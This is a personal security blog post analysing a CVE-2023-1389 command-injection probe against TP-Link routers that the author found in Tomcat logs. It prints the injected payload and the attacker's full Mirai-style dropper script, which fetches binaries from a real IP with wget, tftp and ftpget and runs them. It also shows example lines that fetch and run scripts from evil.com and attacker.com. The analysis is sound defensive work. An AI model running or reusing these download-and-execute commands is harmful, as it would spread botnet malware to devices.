---
title: Record application being injected into an attack 2025-06-11
icon: pen-to-square
date: 2025-06-11
order: 1
author: Rain Man
category:
  - network-security
# A page can have multiple tags
tag:
  - CVE-2023-1389
# this page is sticky in article list
sticky: true
# this page will appear in starred articles
star: true
---

[[TOC]]

# Record application being injected into an attack 2025-06-11

## Background

Today, while checking the application logs, I accidentally discovered a suspicious log entry as follows
```text
Note: further occurrences of HTTP request parsing errors will be logged at DEBUG level. 
java.lang.IllegalArgumentException: Invalid character found in the request target [/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(wget+http://31.59.40.187/x/tplink+-O-|sh) ]. The valid characters are defined in RFC 7230 and RFC 3986
	at org.apache.coyote.http11.Http11InputBuffer.parseRequestLine(Http11InputBuffer.java:484)
	at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:270)
	at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:63)
	at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:905)
	at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1743)
	at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:52)
	at org.apache.tomcat.util.threads.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1190)
	at org.apache.tomcat.util.threads.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:659)
	at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:63)
	at java.base/java.lang.Thread.run(Thread.java:1583)
```
This raised my high alert, as the request contained an obvious command injection attempt.

```shell
$(wget+http://31.59.40.187/x/tplink+-O-|sh)
```
::: danger
Please do not execute this command on your own device
:::

Since my application uses Tomcat, which detected illegal characters (such as ;, |, $, + etc.) when parsing the HTTP request line, violating HTTP protocol (RFC 7230, RFC 3986);

Therefore, Tomcat refused to process the request and did not execute any commands. The application is secure, but it indicates that the application is being scanned/probed.

## Analysis

The attack URI is:
```text
[/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(wget+http://31.59.40.187/x/tplink+-O-|sh) ]
```
I haven't seen the usage of `;` before, but after checking, I found it's a legitimate parameter passing method supported in embedded devices and older web frameworks.

`stok` is a field commonly used in TP-Link and OpenWRT (LuCI) devices to represent a "session token".

Regarding `country=$(wget+http://31.59.40.187/x/tplink+-O-|sh)`
If the server has a vulnerability, for example:
```shell
uci set system.@system[0].country="$country"
```
Or directly execute
```shell
eval "uci set system.@system[0].country=$country"

```
Then at this point:
```shell
$country = $(wget http://... | sh)
```
This would lead to the actual execution of:
```shell
wget http://31.59.40.187/x/tplink -O - | sh
```
This is equivalent to downloading and executing a malicious script remotely.


Subsequently, I obtained the content of `http://31.59.40.187/x/tplink`.

```shell
# TP-Link is aware of reports that the Remote Code Execution (REC) vulnerability detailed in CVE-2023-1389 in AX21 has been added to the Mirai botnet Arsenal.


cd /tmp; wget http://31.59.40.187/j/mle1; chmod 777 mle1; ./mle1 tplink; rm mle1
cd /tmp; wget http://31.59.40.187/j/mbe1; chmod 777 mbe1; ./mbe1 tplink; rm mbe1
cd /tmp; wget http://31.59.40.187/j/aale1; chmod 777 aale1; ./aale1 tplink; rm aale1
cd /tmp; wget http://31.59.40.187/j/a5le1; chmod 777 a5le1;./a5le1 tplink; rm a5le1
cd /tmp; wget http://31.59.40.187/j/a7le1; chmod 777 a7le1; ./a7le1 tplink; rm a7le1
cd /tmp; wget http://31.59.40.187/j/ppc1; chmod 777 ppc1; ./ppc1 tplink; rm ppc1
cd /tmp; wget http://31.59.40.187/j/xle1; chmod 777 xle1; ./xle1 tplink; rm xle1
cd /tmp; wget http://31.59.40.187/j/xale1; chmod 777 xale1; ./xale1 tplink; rm xale1

#cd /tmp; tftp -g -r mle1 31.59.40.187; chmod 777 mle1; ./mle1 tplink; rm mle1
#cd /tmp; tftp -g -r mbe1 31.59.40.187; chmod 777 mbe1; ./mbe1 tplink; rm mbe1
#cd /tmp; tftp -g -r aale1 31.59.40.187; chmod 777 aale1; ./aale1 tplink; rm aale1
#cd /tmp; tftp -g -r a5le1 31.59.40.187; chmod 777 a5le1;./a5le1 tplink; rm a5le1
#cd /tmp; tftp -g -r a7le1 31.59.40.187; chmod 777 a7le1; ./a7le1 tplink; rm a7le1
#cd /tmp; tftp -g -r ppc1 31.59.40.187; chmod 777 ppc1; ./ppc1 tplink; rm ppc1
#cd /tmp; tftp -g -r xle1 31.59.40.187; chmod 777 xle1; ./xle1 tplink; rm xle1
#cd /tmp; tftp -g -r xale1 31.59.40.187; chmod 777 xale1; ./xale1 tplink; rm xale1

cd /tmp; ftpget 31.59.40.187 mle1 mle1; chmod 777 mle1; ./mle1 tplink; rm mle1
cd /tmp; ftpget 31.59.40.187 mbe1 mbe1; chmod 777 mbe1; ./mbe1 tplink; rm mbe1
cd /tmp; ftpget 31.59.40.187 aale1 aale1; chmod 777 aale1; ./aale1 tplink; rm aale1
cd /tmp; ftpget 31.59.40.187 a5le1 a5le1; chmod 777 a5le1;./a5le1 tplink; rm a5le1
cd /tmp; ftpget 31.59.40.187 a7le1 a7le1; chmod 777 a7le1; ./a7le1 tplink; rm a7le1
cd /tmp; ftpget 31.59.40.187 ppc1 ppc1; chmod 777 ppc1; ./ppc1 tplink; rm ppc1
cd /tmp; ftpget 31.59.40.187 xle1 xle1; chmod 777 xle1; ./xle1 tplink; rm xle1
cd /tmp; ftpget 31.59.40.187 xale1 xale1; chmod 777 xale1; ./xale1 tplink; rm xale1
```

The script repeatedly executes the following logic:
```shell
cd /tmp
wget http://31.59.40.187/j/mle1
chmod 777 mle1
./mle1 tplink
rm mle1
```

`mle1, mbe1, aale1, a5le1, a7le1, ppc1, xle1, xale1` these filenames likely represent copies of the same malicious program built for different CPU architectures, prepared for various embedded devices or server environments, ensuring infection of as many target devices as possible.


The comment above indicates that this is an *RCE attack*, and it includes vulnerability information *CVE-2023-1389*.

::: details RCE攻击介绍

RCE (Remote Code Execution) attack is a type of attack where an attacker can remotely execute arbitrary code on a victim's device or system. RCE is one of the most serious network security vulnerabilities, typically meaning:

>The attacker only needs to send a specially crafted request to control the behavior of the target server, device, or operating system.

**Common Types of RCE Attack Patterns**

1. Command Injection
   When user input is concatenated with Shell commands without proper escaping, causing commands entered by attackers to be directly executed, for example:
   ```http request
   GET /api?name=abc;wget http://evil.com/shell.sh|sh HTTP/1.1
   ```

2. Insecure Deserialization
   Deserializing user-input objects, where attackers construct malicious payloads to trigger execution logic, for example:
   ```java
   ObjectInputStream.readObject();  // 读取了攻击者发送的恶意对象
   ```

3. Template Injection
   When template engines allow script execution, attackers can trigger arbitrary code execution by injecting expressions, for example:
   ```http request
   ${new java.lang.ProcessBuilder("calc").start()}
   ```
4. Path Traversal + WebShell Upload
   Attackers upload malicious scripts (such as .php files) and access them for execution through means like path traversal.

5. Remote Loading and Execution
   Server-side code allows loading and executing scripts from remote URLs, for example:
   ```shell
   wget http://attacker.com/x.sh | sh
   ```

:::

Searching for this vulnerability on the NVD website, I found that it is a vulnerability that only exists in specific TP-Link firmware versions.

>**TP-Link Archer AX21 (AX1800) firmware versions before 1.1.4 Build 20230219** contained a command injection vulnerability in the country form of the /cgi-bin/luci;stok=/locale endpoint on the web management interface.
Specifically, the country parameter of the write operation was not sanitized before being used in a call to popen(), allowing an unauthenticated attacker to inject commands, which would be run as root, with a simple POST request.

## Countermeasures
Although my server does not have this vulnerability, to prevent other RCE attacks, some security checks and defensive measures are still necessary.

1. Add unknown IPs to the blacklist
2. Check all open ports and only keep necessary ports open
3. Update system security patches
4. Check for abnormal scheduled tasks/processes
```shell
crontab -l
ps | grep -v '\[' | grep -v 'root'
```

## Afterword

Writing to this point, I suddenly realized that my home broadband is dialed through an OpenWRT router and connected via the bridge mode of the optical modem, which seems to be exposed to the public internet and also has the risk of being scanned and attacked by malicious scripts. I need to check the firewall rules.
This network connection method has been used for two or three years without updating the router firmware. If it were truly attacked by malicious scripts, I can't imagine the consequences for all devices at home, including the NAS.
